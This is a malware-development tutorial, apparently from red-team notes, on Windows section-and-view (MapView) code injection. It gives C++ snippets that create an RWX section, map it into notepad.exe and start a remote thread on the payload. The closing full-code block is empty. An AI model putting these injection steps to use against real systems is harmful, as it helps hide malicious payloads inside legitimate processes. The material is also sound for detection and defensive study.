---
title: Sections and Views Injection
category: Maldev-Code Injection
order: 2
---

This technique has a different way to inject the code on a remote process. MapView Code Injection uses typicall internal operation between processes. 

It is common that one process create a new section and shares the data with another process. Every memory section corresponds to one or more views. A view of a section referes to the specific part of the sectio htat is visible and accesible to a process.

So we can map a section to the remote process and create a view in order to share the shellcode to the remote process.

* `NtCreateSection`: Create a new page-file-backed section.
* `NtMapViewOfSection`: Map the section view on the local process.
* `memcpy`: Copy the payload to the section.
* `NtMapViewOfSection`: Map the same section view in the target process.
* `RtlCreateUserThread`: Execute the payload on the remote process.


# Analysis

First we need to create a Section handle on our local process with `PAGE_EXECUTE_READWRITE` rights.


```cpp
status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
```

As we can see the new handle `0xAC` was successfuly created with `FULL_CONTROL` cause the section access was defined with `SECTION_ALL_ACCESS`. We only need `SECTION_MAP_READ` `SECTION_MAP_WRITE` and `SECTION_MAP_EXECUTE` but in that example a full control was set.

![](/rtnotes/images/sections_01.png)

Once created the section we need to map to a new local view. A `RW` rights are needed in order to copy the payload to the section.

```cpp
status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_READWRITE);
```

When the section is already mapped, we can see the memory space on the local process.

![](/rtnotes/images/sections_02.png)

Now the payload can be copied to the local view.

![](/rtnotes/images/sections_03.png)

In order to execute the payload on a remote process we need to create a remote view of the same section. To do that we need the handler of the target process.

```cpp
pid = FindProcess("notepad.exe");
hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
status = pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *)&payload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
```

As we can see the section was successfuly mapped to the remote process and the payload was delivered on memory.

![](/rtnotes/images/sections_04.png)

Finally we can use `RtlCreateUserThread` to execute the remote view.

```cpp
pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
if(hThread != NULL){
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
}
```

![](/rtnotes/images/sections_05.png)

# Code

Example of MapView injection:

```cpp


```